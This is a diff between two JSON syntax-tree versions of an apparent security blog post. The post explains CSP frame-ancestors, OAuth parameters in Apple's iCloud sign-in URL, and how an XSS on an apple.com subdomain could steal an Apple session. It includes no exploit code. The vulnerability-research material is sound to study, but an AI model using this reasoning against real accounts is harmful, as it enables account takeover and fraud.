<         {
<           "type": "text",
<           "value": "Give me a few seconds to gush about how great Content Security Policy is.\n",
<           "position": {
<             "start": {
<               "line": 244,
<               "column": 1,
<               "offset": 12383
<             },
<             "end": {
<               "line": 245,
<               "column": 1,
<               "offset": 12458
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options",
<           "position": {
<             "start": {
<               "line": 245,
<               "column": 1,
<               "offset": 12458
<             },
<             "end": {
<               "line": 245,
<               "column": 18,
<               "offset": 12475
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " only kinda worked. Let's say I check the incoming website\nloading us to see if it's ",
<           "position": {
<             "start": {
<               "line": 245,
<               "column": 18,
<               "offset": 12475
<             },
<             "end": {
<               "line": 246,
<               "column": 27,
<               "offset": 12561
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 246,
<               "column": 27,
<               "offset": 12561
<             },
<             "end": {
<               "line": 246,
<               "column": 43,
<               "offset": 12577
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", that is:",
<           "position": {
<             "start": {
<               "line": 246,
<               "column": 43,
<               "offset": 12577
<             },
<             "end": {
<               "line": 246,
<               "column": 53,
<               "offset": 12587
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 244,
<           "column": 1,
<           "offset": 12383
<         },
<         "end": {
<           "line": 246,
<           "column": 53,
<           "offset": 12587
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "HTTP GET /watch_for_rolling_rocks_embed\n\nHTTP/1.1\nHost: mywebsite1.com\nOrigin: https://mywebsite2.com\nReferer: https://mywebsite2.com/pannenkoek2012fanpage.html\nAccept: text/html\n\nHTTP/1.1 200 OK\n<!DOCTYPE HTML>\n    <head>\n    <title> check out this video!!!! </title> ...\n",
<       "position": {
<         "start": {
<           "line": 248,
<           "column": 1,
<           "offset": 12591
<         },
<         "end": {
<           "line": 262,
<           "column": 4,
<           "offset": 12886
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "In this very oversimplified case, ",
<           "position": {
<             "start": {
<               "line": 264,
<               "column": 1,
<               "offset": 12890
<             },
<             "end": {
<               "line": 264,
<               "column": 35,
<               "offset": 12924
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite1.com",
<           "position": {
<             "start": {
<               "line": 264,
<               "column": 35,
<               "offset": 12924
<             },
<             "end": {
<               "line": 264,
<               "column": 51,
<               "offset": 12940
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " notices that it's being\nembedded by ",
<           "position": {
<             "start": {
<               "line": 264,
<               "column": 51,
<               "offset": 12940
<             },
<             "end": {
<               "line": 265,
<               "column": 13,
<               "offset": 12978
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 265,
<               "column": 13,
<               "offset": 12978
<             },
<             "end": {
<               "line": 265,
<               "column": 29,
<               "offset": 12994
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and doesn't send ",
<           "position": {
<             "start": {
<               "line": 265,
<               "column": 29,
<               "offset": 12994
<             },
<             "end": {
<               "line": 265,
<               "column": 47,
<               "offset": 13012
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options: DENY",
<           "position": {
<             "start": {
<               "line": 265,
<               "column": 47,
<               "offset": 13012
<             },
<             "end": {
<               "line": 265,
<               "column": 70,
<               "offset": 13035
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". But what\nif ",
<           "position": {
<             "start": {
<               "line": 265,
<               "column": 70,
<               "offset": 13035
<             },
<             "end": {
<               "line": 266,
<               "column": 4,
<               "offset": 13050
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 266,
<               "column": 4,
<               "offset": 13050
<             },
<             "end": {
<               "line": 266,
<               "column": 20,
<               "offset": 13066
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " itself forgets to send ",
<           "position": {
<             "start": {
<               "line": 266,
<               "column": 20,
<               "offset": 13066
<             },
<             "end": {
<               "line": 266,
<               "column": 44,
<               "offset": 13090
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options: DENY",
<           "position": {
<             "start": {
<               "line": 266,
<               "column": 44,
<               "offset": 13090
<             },
<             "end": {
<               "line": 266,
<               "column": 67,
<               "offset": 13113
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " when visited?\nThen ",
<           "position": {
<             "start": {
<               "line": 266,
<               "column": 67,
<               "offset": 13113
<             },
<             "end": {
<               "line": 267,
<               "column": 6,
<               "offset": 13134
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 267,
<               "column": 6,
<               "offset": 13134
<             },
<             "end": {
<               "line": 267,
<               "column": 22,
<               "offset": 13150
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " can now be used to embed ",
<           "position": {
<             "start": {
<               "line": 267,
<               "column": 22,
<               "offset": 13150
<             },
<             "end": {
<               "line": 267,
<               "column": 48,
<               "offset": 13176
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite1.com",
<           "position": {
<             "start": {
<               "line": 267,
<               "column": 48,
<               "offset": 13176
<             },
<             "end": {
<               "line": 267,
<               "column": 64,
<               "offset": 13192
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", and bypass our\n",
<           "position": {
<             "start": {
<               "line": 267,
<               "column": 64,
<               "offset": 13192
<             },
<             "end": {
<               "line": 268,
<               "column": 1,
<               "offset": 13210
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options",
<           "position": {
<             "start": {
<               "line": 268,
<               "column": 1,
<               "offset": 13210
<             },
<             "end": {
<               "line": 268,
<               "column": 18,
<               "offset": 13227
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " setting. We can make an embed of ",
<           "position": {
<             "start": {
<               "line": 268,
<               "column": 18,
<               "offset": 13227
<             },
<             "end": {
<               "line": 268,
<               "column": 52,
<               "offset": 13261
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 268,
<               "column": 52,
<               "offset": 13261
<             },
<             "end": {
<               "line": 268,
<               "column": 68,
<               "offset": 13277
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and\n",
<           "position": {
<             "start": {
<               "line": 268,
<               "column": 68,
<               "offset": 13277
<             },
<             "end": {
<               "line": 269,
<               "column": 1,
<               "offset": 13283
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite1.com",
<           "position": {
<             "start": {
<               "line": 269,
<               "column": 1,
<               "offset": 13283
<             },
<             "end": {
<               "line": 269,
<               "column": 17,
<               "offset": 13299
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " comes along for the ride.",
<           "position": {
<             "start": {
<               "line": 269,
<               "column": 17,
<               "offset": 13299
<             },
<             "end": {
<               "line": 269,
<               "column": 43,
<               "offset": 13325
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 264,
<           "column": 1,
<           "offset": 12890
<         },
<         "end": {
<           "line": 269,
<           "column": 43,
<           "offset": 13325
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "That's just one way ",
<           "position": {
<             "start": {
<               "line": 271,
<               "column": 1,
<               "offset": 13329
<             },
<             "end": {
<               "line": 271,
<               "column": 21,
<               "offset": 13349
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 271,
<               "column": 21,
<               "offset": 13349
<             },
<             "end": {
<               "line": 271,
<               "column": 38,
<               "offset": 13366
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " improves on ",
<           "position": {
<             "start": {
<               "line": 271,
<               "column": 38,
<               "offset": 13366
<             },
<             "end": {
<               "line": 271,
<               "column": 51,
<               "offset": 13379
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options",
<           "position": {
<             "start": {
<               "line": 271,
<               "column": 51,
<               "offset": 13379
<             },
<             "end": {
<               "line": 271,
<               "column": 68,
<               "offset": 13396
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". With\n",
<           "position": {
<             "start": {
<               "line": 271,
<               "column": 68,
<               "offset": 13396
<             },
<             "end": {
<               "line": 272,
<               "column": 1,
<               "offset": 13404
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 272,
<               "column": 1,
<               "offset": 13404
<             },
<             "end": {
<               "line": 272,
<               "column": 18,
<               "offset": 13421
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", it checks that all the embedding pages all the way up are\nallowed to embed the content.",
<           "position": {
<             "start": {
<               "line": 272,
<               "column": 18,
<               "offset": 13421
<             },
<             "end": {
<               "line": 273,
<               "column": 30,
<               "offset": 13511
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 271,
<           "column": 1,
<           "offset": 13329
<         },
<         "end": {
<           "line": 273,
<           "column": 30,
<           "offset": 13511
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "URL Parsing, My Old Friend {#url_parsing,_my_old_friend}",
<           "position": {
<             "start": {
<               "line": 275,
<               "column": 1,
<               "offset": 13515
<             },
<             "end": {
<               "line": 275,
<               "column": 57,
<               "offset": 13571
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 275,
<           "column": 1,
<           "offset": 13515
<         },
<         "end": {
<           "line": 276,
<           "column": 27,
<           "offset": 13599
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "url parsing, my old friend",
<       "label": "URL Parsing, My Old Friend",
<       "title": null,
<       "url": "#url_parsing,_my_old_friend",
<       "position": {
<         "start": {
<           "line": 278,
<           "column": 1,
<           "offset": 13603
<         },
<         "end": {
<           "line": 278,
<           "column": 59,
<           "offset": 13661
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§3",
<       "label": "§3",
<       "title": null,
<       "url": "#url_parsing,_my_old_friend",
<       "position": {
<         "start": {
<           "line": 279,
<           "column": 1,
<           "offset": 13663
<         },
<         "end": {
<           "line": 279,
<           "column": 34,
<           "offset": 13696
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Alright, so the iCloud login page is allowed to be embedded in iCloud.com\nbecause it negotiates a ",
<           "position": {
<             "start": {
<               "line": 281,
<               "column": 1,
<               "offset": 13700
<             },
<             "end": {
<               "line": 282,
<               "column": 25,
<               "offset": 13799
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors https://www.icloud.com;",
<           "position": {
<             "start": {
<               "line": 282,
<               "column": 25,
<               "offset": 13799
<             },
<             "end": {
<               "line": 282,
<               "column": 66,
<               "offset": 13840
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " Content\nSecurity Policy directive. But how is it negotiated? Let's take a look at the\nactual URL which is embedded.",
<           "position": {
<             "start": {
<               "line": 282,
<               "column": 66,
<               "offset": 13840
<             },
<             "end": {
<               "line": 284,
<               "column": 30,
<               "offset": 13958
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 281,
<           "column": 1,
<           "offset": 13700
<         },
<         "end": {
<           "line": 284,
<           "column": 30,
<           "offset": 13958
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": "URL",
<       "meta": null,
<       "value": "https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fwww.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB",
<       "position": {
<         "start": {
<           "line": 286,
<           "column": 1,
<           "offset": 13962
<         },
<         "end": {
<           "line": 288,
<           "column": 4,
<           "offset": 14251
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "And break it down a bit because not everyone's brain is as broken as mine to be\nable to read that:",
<           "position": {
<             "start": {
<               "line": 290,
<               "column": 1,
<               "offset": 14255
<             },
<             "end": {
<               "line": 291,
<               "column": 19,
<               "offset": 14354
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 290,
<           "column": 1,
<           "offset": 14255
<         },
<         "end": {
<           "line": 291,
<           "column": 19,
<           "offset": 14354
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "Resource:  https://idmsa.apple.com/appleauth/auth/authorize/signin\nParameters:\n    client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\n\n    redirect_uri=https%3A%2F%2Fwww.icloud.com\n\n    response_mode=web_message\n\n    response_type=code\n\n    frame_id=72948678-5374-4a90-a176-31f75bb38405\n    \n    locale=en_GB",
<       "position": {
<         "start": {
<           "line": 293,
<           "column": 1,
<           "offset": 14358
<         },
<         "end": {
<           "line": 307,
<           "column": 4,
<           "offset": 14712
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This looks a lot like a request with the OAuth authorization protocol. Probably\nbecause ",
<           "position": {
<             "start": {
<               "line": 309,
<               "column": 1,
<               "offset": 14716
4900,5052d1669
<             "end": {
<               "line": 310,
<               "column": 9,
<               "offset": 14805
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 310,
<               "column": 9,
<               "offset": 14805
<             },
<             "end": {
<               "line": 310,
<               "column": 26,
<               "offset": 14822
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is the Apple ID server. OAuth is also perfect because\nOAuth generates tokens that are specific to each ",
<           "position": {
<             "start": {
<               "line": 310,
<               "column": 26,
<               "offset": 14822
<             },
<             "end": {
<               "line": 311,
<               "column": 50,
<               "offset": 14927
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "client_id",
<           "position": {
<             "start": {
<               "line": 311,
<               "column": 50,
<               "offset": 14927
<             },
<             "end": {
<               "line": 311,
<               "column": 61,
<               "offset": 14938
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", that is, the\ntokens correspond to the ",
<           "position": {
<             "start": {
<               "line": 311,
<               "column": 61,
<               "offset": 14938
<             },
<             "end": {
<               "line": 312,
<               "column": 26,
<               "offset": 14979
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "client_id",
<           "position": {
<             "start": {
<               "line": 312,
<               "column": 26,
<               "offset": 14979
<             },
<             "end": {
<               "line": 312,
<               "column": 37,
<               "offset": 14990
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which represents the app requesting Apple\nID, in this case iCloud and they are not usually interchangable. I couldn't,\nthen, if this were implemented correctly take your iMessage authentication token\nand use it to get into your iCloud.",
<           "position": {
<             "start": {
<               "line": 312,
<               "column": 37,
<               "offset": 14990
<             },
<             "end": {
<               "line": 315,
<               "column": 36,
<               "offset": 15230
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 309,
<           "column": 1,
<           "offset": 14716
<         },
<         "end": {
<           "line": 315,
<           "column": 36,
<           "offset": 15230
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "list",
<       "ordered": false,
<       "start": null,
<       "spread": true,
<       "children": [
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
5056a1674,1690
>                   "type": "text",
>                   "value": "Typically, for an XSS on the subdomain ",
>                   "position": {
>                     "start": {
>                       "line": 158,
>                       "column": 1,
>                       "offset": 7807
>                     },
>                     "end": {
>                       "line": 158,
>                       "column": 40,
>                       "offset": 7846
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
5058c1692
<                   "value": "response_type=code",
---
>                   "value": "users.bradsdrinks.com",
5061,5063c1695,1697
<                       "line": 317,
<                       "column": 4,
<                       "offset": 15237
---
>                       "line": 158,
>                       "column": 40,
>                       "offset": 7846
5066,5068c1700,1702
<                       "line": 317,
<                       "column": 24,
<                       "offset": 15257
---
>                       "line": 158,
>                       "column": 63,
>                       "offset": 7869
5075c1709
<                   "value": " is an OAuth specific parameter asking for an OAuth code\nwhich the iCloud servers can exchange for an Apple ID credential.",
---
>                   "value": " we only get\naccess to whatever ",
5078,5080c1712,1714
<                       "line": 317,
<                       "column": 24,
<                       "offset": 15257
---
>                       "line": 158,
>                       "column": 63,
>                       "offset": 7869
5083,5085c1717,1827
<                       "line": 318,
<                       "column": 66,
<                       "offset": 15380
---
>                       "line": 159,
>                       "column": 20,
>                       "offset": 7902
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "bradsdrinks.com",
>                   "position": {
>                     "start": {
>                       "line": 159,
>                       "column": 20,
>                       "offset": 7902
>                     },
>                     "end": {
>                       "line": 159,
>                       "column": 37,
>                       "offset": 7919
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " can do. Which means if Brad's Great Drinks,\nUSA owns another fine website, ",
>                   "position": {
>                     "start": {
>                       "line": 159,
>                       "column": 37,
>                       "offset": 7919
>                     },
>                     "end": {
>                       "line": 160,
>                       "column": 32,
>                       "offset": 7996
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "bradsbetterdrinks.com",
>                   "position": {
>                     "start": {
>                       "line": 160,
>                       "column": 32,
>                       "offset": 7996
>                     },
>                     "end": {
>                       "line": 160,
>                       "column": 55,
>                       "offset": 8019
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " we can't mess with that.\nFor ",
>                   "position": {
>                     "start": {
>                       "line": 160,
>                       "column": 55,
>                       "offset": 8019
>                     },
>                     "end": {
>                       "line": 161,
>                       "column": 5,
>                       "offset": 8050
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "apple.com",
>                   "position": {
>                     "start": {
>                       "line": 161,
>                       "column": 5,
>                       "offset": 8050
>                     },
>                     "end": {
>                       "line": 161,
>                       "column": 16,
>                       "offset": 8061
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", this means I can steal the 'apple session', which indicates who\nyou are to Apple, and do bad stuff you wouldn't want me to do, like purchase\ngifts for myself in the apple store with ",
>                   "position": {
>                     "start": {
>                       "line": 161,
>                       "column": 16,
>                       "offset": 8061
>                     },
>                     "end": {
>                       "line": 163,
>                       "column": 42,
>                       "offset": 8247
5087a1830
>                       1,
5090a1834,1885
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "your",
>                       "position": {
>                         "start": {
>                           "line": 163,
>                           "column": 43,
>                           "offset": 8248
>                         },
>                         "end": {
>                           "line": 163,
>                           "column": 47,
>                           "offset": 8252
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 163,
>                       "column": 42,
>                       "offset": 8247
>                     },
>                     "end": {
>                       "line": 163,
>                       "column": 48,
>                       "offset": 8253
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " credit card.",
>                   "position": {
>                     "start": {
>                       "line": 163,
>                       "column": 48,
>                       "offset": 8253
>                     },
>                     "end": {
>                       "line": 163,
>                       "column": 61,
>                       "offset": 8266
>                     },
>                     "indent": []
>                   }
5095,5097c1890,1892
<                   "line": 317,
<                   "column": 4,
<                   "offset": 15237
---
>                   "line": 158,
>                   "column": 1,
>                   "offset": 7807
5100,5102c1895,1897
<                   "line": 318,
<                   "column": 66,
<                   "offset": 15380
---
>                   "line": 163,
>                   "column": 61,
>                   "offset": 8266
5104a1900,1903
>                   1,
>                   1,
>                   1,
>                   1,
5108,5114d1906
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 317,
<               "column": 1,
<               "offset": 15234
5116,5119c1908,1947
<             "end": {
<               "line": 319,
<               "column": 1,
<               "offset": 15382
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "At this point, trying to think of the worst thing that could possibly happen\nwith this vulnerability as I often seem to be doing I thought -- well, what if I\nget into iCloud? That would be really, really terrible right?",
>                   "position": {
>                     "start": {
>                       "line": 165,
>                       "column": 1,
>                       "offset": 8270
>                     },
>                     "end": {
>                       "line": 167,
>                       "column": 62,
>                       "offset": 8491
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 165,
>                   "column": 1,
>                   "offset": 8270
>                 },
>                 "end": {
>                   "line": 167,
>                   "column": 62,
>                   "offset": 8491
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
5121,5131d1948
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
5135a1953,2021
>                   "type": "text",
>                   "value": "But then, I recall the oddity that icloud is ",
>                   "position": {
>                     "start": {
>                       "line": 169,
>                       "column": 1,
>                       "offset": 8495
>                     },
>                     "end": {
>                       "line": 169,
>                       "column": 46,
>                       "offset": 8540
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "not",
>                       "position": {
>                         "start": {
>                           "line": 169,
>                           "column": 47,
>                           "offset": 8541
>                         },
>                         "end": {
>                           "line": 169,
>                           "column": 50,
>                           "offset": 8544
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 169,
>                       "column": 46,
>                       "offset": 8540
>                     },
>                     "end": {
>                       "line": 169,
>                       "column": 51,
>                       "offset": 8545
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " on ",
>                   "position": {
>                     "start": {
>                       "line": 169,
>                       "column": 51,
>                       "offset": 8545
>                     },
>                     "end": {
>                       "line": 169,
>                       "column": 55,
>                       "offset": 8549
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
5137c2023
<                   "value": "redirect_uri",
---
>                   "value": "apple.com",
5140,5142c2026,2028
<                       "line": 320,
<                       "column": 4,
<                       "offset": 15387
---
>                       "line": 169,
>                       "column": 55,
>                       "offset": 8549
5145,5147c2031,2033
<                       "line": 320,
<                       "column": 18,
<                       "offset": 15401
---
>                       "line": 169,
>                       "column": 66,
>                       "offset": 8560
5154c2040
<                   "value": " is also an OAuth specific concept -- of where the token (in this\ncase the iCloud Apple ID authorization) goes to. But ",
---
>                   "value": ". A rather\nsensible decision. If, for example instead of using your ",
5157,5159c2043,2045
<                       "line": 320,
<                       "column": 18,
<                       "offset": 15401
---
>                       "line": 169,
>                       "column": 66,
>                       "offset": 8560
5162,5164c2048,2050
<                       "line": 321,
<                       "column": 54,
<                       "offset": 15521
---
>                       "line": 170,
>                       "column": 58,
>                       "offset": 8629
5173c2059
<                   "value": "redirect_uri",
---
>                   "value": "apple.com",
5176,5178c2062,2064
<                       "line": 321,
<                       "column": 54,
<                       "offset": 15521
---
>                       "line": 170,
>                       "column": 58,
>                       "offset": 8629
5181,5183c2067,2069
<                       "line": 321,
<                       "column": 68,
<                       "offset": 15535
---
>                       "line": 170,
>                       "column": 69,
>                       "offset": 8640
5190c2076
<                   "value": " doesn't make\nsense in this concept because we're already on ",
---
>                   "value": " session,\n",
5193,5195c2079,2081
<                       "line": 321,
<                       "column": 68,
<                       "offset": 15535
---
>                       "line": 170,
>                       "column": 69,
>                       "offset": 8640
5198,5200c2084,2086
<                       "line": 322,
<                       "column": 48,
<                       "offset": 15597
---
>                       "line": 171,
>                       "column": 1,
>                       "offset": 8651
5209c2095
<                   "value": "icloud.com",
---
>                   "value": "iCloud.com",
5212,5214c2098,2100
<                       "line": 322,
<                       "column": 48,
<                       "offset": 15597
---
>                       "line": 171,
>                       "column": 1,
>                       "offset": 8651
5217,5219c2103,2105
<                       "line": 322,
<                       "column": 60,
<                       "offset": 15609
---
>                       "line": 171,
>                       "column": 13,
>                       "offset": 8663
5226c2112
<                   "value": " so unless some weird\nstuff is going on I'm not expecting this frame to redirect to ",
---
>                   "value": " used a special, iCloud specific session negotiated ",
5229,5231c2115,2117
<                       "line": 322,
<                       "column": 60,
<                       "offset": 15609
---
>                       "line": 171,
>                       "column": 13,
>                       "offset": 8663
5234,5236c2120,2174
<                       "line": 323,
<                       "column": 63,
<                       "offset": 15694
---
>                       "line": 171,
>                       "column": 65,
>                       "offset": 8715
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "with",
>                       "position": {
>                         "start": {
>                           "line": 171,
>                           "column": 66,
>                           "offset": 8716
>                         },
>                         "end": {
>                           "line": 171,
>                           "column": 70,
>                           "offset": 8720
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 171,
>                       "column": 65,
>                       "offset": 8715
>                     },
>                     "end": {
>                       "line": 171,
>                       "column": 71,
>                       "offset": 8721
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "\n",
>                   "position": {
>                     "start": {
>                       "line": 171,
>                       "column": 71,
>                       "offset": 8721
>                     },
>                     "end": {
>                       "line": 172,
>                       "column": 1,
>                       "offset": 8723
5245c2183
<                   "value": "icloud.com",
---
>                   "value": "apple.com",
5248,5250c2186,2188
<                       "line": 323,
<                       "column": 63,
<                       "offset": 15694
---
>                       "line": 172,
>                       "column": 1,
>                       "offset": 8723
5253,5255c2191,2193
<                       "line": 323,
<                       "column": 75,
<                       "offset": 15706
---
>                       "line": 172,
>                       "column": 12,
>                       "offset": 8734
5262c2200
<                   "value": ".",
---
>                   "value": " requiring your username and password input then hacking the much\nlarger and thus easier to attack ",
5265,5267c2203,2205
<                       "line": 323,
<                       "column": 75,
<                       "offset": 15706
---
>                       "line": 172,
>                       "column": 12,
>                       "offset": 8734
5270,5272c2208,2246
<                       "line": 323,
<                       "column": 76,
<                       "offset": 15707
---
>                       "line": 173,
>                       "column": 34,
>                       "offset": 8834
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "apple.com",
>                   "position": {
>                     "start": {
>                       "line": 173,
>                       "column": 34,
>                       "offset": 8834
>                     },
>                     "end": {
>                       "line": 173,
>                       "column": 45,
>                       "offset": 8845
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " wouldn't leak my nudes.",
>                   "position": {
>                     "start": {
>                       "line": 173,
>                       "column": 45,
>                       "offset": 8845
>                     },
>                     "end": {
>                       "line": 173,
>                       "column": 69,
>                       "offset": 8869
5280,5282c2254,2256
<                   "line": 320,
<                   "column": 4,
<                   "offset": 15387
---
>                   "line": 169,
>                   "column": 1,
>                   "offset": 8495
5285,5287c2259,2261
<                   "line": 323,
<                   "column": 76,
<                   "offset": 15707
---
>                   "line": 173,
>                   "column": 69,
>                   "offset": 8869
5291a2266
>                   1,
5295,5301d2269
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 320,
<               "column": 1,
<               "offset": 15384
5303,5320d2270
<             "end": {
<               "line": 324,
<               "column": 1,
<               "offset": 15709
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
